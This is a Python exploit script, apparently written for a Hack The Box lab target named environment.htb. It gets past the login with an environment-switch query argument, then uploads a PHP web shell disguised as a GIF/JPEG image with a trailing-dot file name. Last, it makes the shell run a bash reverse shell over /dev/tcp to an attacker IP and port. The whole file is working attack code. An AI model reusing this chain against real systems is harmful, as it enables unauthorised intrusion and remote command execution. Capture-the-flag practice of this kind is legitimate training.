import random
import requests
import re
import io
import threading

base_url = 'http://environment.htb'
login_url = base_url + '/login'
fname = f"webshell{random.randint(1, 1000)}.php"

def start_reverse_shell(fname):
    IP = '10.10.14.196'
    PORT = 4444

    webshell_url = f'http://environment.htb/storage/files/{fname}?cmd=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F{IP}%2F{PORT}+0%3E%261%27'
    print('Starting reverse shell...')
    res = requests.get(webshell_url, allow_redirects=False)
    if res.status_code != 200:
        raise Exception()
    print('Reverse shell response ended', res)

def login(csrf_token, cookies):
    data = {
        'email': 'email@example.com',
        'password': 'admin',
        '_token': csrf_token,
        'remember': 'True'
    }
    res = requests.post(login_url+'?--env=preprod', data=data, cookies=cookies, allow_redirects=False)
    if res.status_code != 302:
        raise Exception()
    cookies = extract_cookies(res)
    print('Got laravel_session...')
    return cookies


def extract_cookies(res):
    cookies = {}
    cookies['laravel_session'] = res.cookies.get('laravel_session')
    cookies['XSRF-TOKEN'] = res.cookies.get('XSRF-TOKEN')
    return cookies

def get_csrf(url, req_cookies={}):
    res = requests.get(url, cookies=req_cookies, allow_redirects=False)
    if res.status_code != 200:
        print(res, res.text)
        raise Exception()
    match = re.search(r'name="_token" value="(\w+)"', res.text)
    csrf_token = match.group(1)
    print('Got csrf_token: ', csrf_token)
    return csrf_token, res

def upload_webshell(cookies, fname):
    webshell = '''GIF87a
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" id="cmd" size="200">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['cmd'])) {
            system($_GET['cmd']);
        }
    ?>
    </pre>
    </body>
    <script>document.ElementById("cmd").focus();</script>
    </html>
    '''

    csrf_token, _ = get_csrf(base_url+'/management/profile', cookies)
    print('Uploading web shell...')
    file = io.BytesIO(webshell.encode('utf-8'))
    files = {
        'upload': (fname+'.', file, 'image/jpeg')
    }
    data = {
        '_token': csrf_token
    }
    upload_url = base_url + '/upload'
    res = requests.post(upload_url, files=files, data=data, cookies=cookies, allow_redirects=False)
    if res.status_code != 200 and 'url' not in res.text:
        raise Exception()

csrf_token, res = get_csrf(login_url)
cookies = extract_cookies(res)
cookies = login(csrf_token, cookies)
upload_webshell(cookies, fname)
#thread = threading.Thread(tar=send_request)
#thread.start()
start_reverse_shell(fname)

